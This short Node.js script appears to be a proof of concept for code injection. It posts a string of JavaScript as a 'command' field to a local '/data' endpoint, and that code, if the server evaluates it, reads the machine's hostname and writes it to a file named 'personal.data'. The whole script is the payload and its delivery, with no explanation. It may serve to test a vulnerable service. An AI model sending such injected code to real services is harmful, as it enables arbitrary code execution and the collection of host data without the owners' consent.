const tiny = require('tiny-json-http');
const port = process.argv[2] ? process.argv[2] : 8000;
const url = 'http://localhost:'+ port +'/data';

var data = "" + 
  "const os = require('os'); " +
  "const write = require('fs').writeFileSync; "+
  "const hostname = JSON.stringify(os.hostname())\n" +
  "write('./personal.data',hostname); "

data = {command: data};
tiny.post({url, data}, (err, result) => {
  process.exit();
}); 
